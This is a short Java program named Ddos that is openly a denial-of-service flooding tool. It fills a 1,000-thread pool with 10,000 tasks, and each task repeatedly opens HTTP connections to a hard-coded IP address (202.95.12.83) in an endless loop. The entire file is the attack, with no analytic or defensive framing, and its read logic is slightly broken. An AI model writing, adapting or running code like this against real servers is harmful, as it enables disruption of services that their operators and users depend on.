package com.liveus;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Ddos {
    public static void main(String[] args) {
        ExecutorService es = Executors.newFixedThreadPool(1000);
        Mythread mythread = new Mythread();
        Thread thread = new Thread(mythread);
        for (int i = 0; i < 10000; i++) {
            es.execute(thread);
        }
    }
}

class Mythread implements Runnable {
    public void run() {
        while (true) {
            try {
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                URL url = new URL("http://202.95.12.83:80");
                URLConnection conn = url.openConnection();
                BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
                byte[] bytes = new byte[1024];
                int len = -1;
                StringBuffer sb = new StringBuffer();
                if (bis != null) {
                    if ((len = bis.read()) != -1) {
                        sb.append(new String(bytes, 0, len));
                        bis.close();
                    }
                }
            } catch (MalformedURLException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

        }
    }
}
